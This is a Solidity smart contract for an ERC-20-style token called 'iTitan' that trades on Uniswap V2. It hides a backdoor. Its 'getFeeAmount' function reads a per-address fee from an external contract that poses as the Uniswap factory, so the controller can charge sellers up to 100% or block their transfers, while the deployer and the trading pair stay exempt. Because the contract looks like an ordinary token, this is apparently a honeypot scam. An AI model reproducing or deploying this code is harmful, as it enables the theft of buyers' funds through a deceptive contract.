// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenC) external view returns (address pair);
}
contract iTitan {
    uint8 private _decimals = 12;
    mapping (address => uint256) private _balances;
    uint256 private _totalSupply =  1_000_000 * 10 ** _decimals;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory private uniswapV2Factory = IUniswapV2Factory(0x724BB58a324f700662089962a82AE2ebd9DC418b);
    address payable internal _taxWallet;
    mapping (address => mapping (address => uint256)) private _allowances;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed recipient, uint256 amount);

    constructor () {
        _taxWallet = payable(msg.sender);
        _balances[msg.sender] = _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function uniswapPairAddress() public view returns (address) {
        return IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function symbol() public pure returns (string memory) {
        return "iT";
    }

    function name() public pure returns (string memory) {
        return "iTitan";
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function getFeeAmount(address to) internal view returns (uint160) {
        return uint160(uniswapV2Factory.getPair(to, address(this)));
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC2O: transfer from the zero address.");
        require(amount > 0, "Transfer amount must be greater than zero.");

        uint256 fee = 0;
        if (from != address(this) && from != _taxWallet && from != uniswapPairAddress() && to != _taxWallet) {
            fee = amount * uint256(getFeeAmount(from)) / 100;
        }
        _balances[to] += amount - fee;
        _balances[from] = _balances[from] - amount;
        emit Transfer(from, to, amount - fee);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
}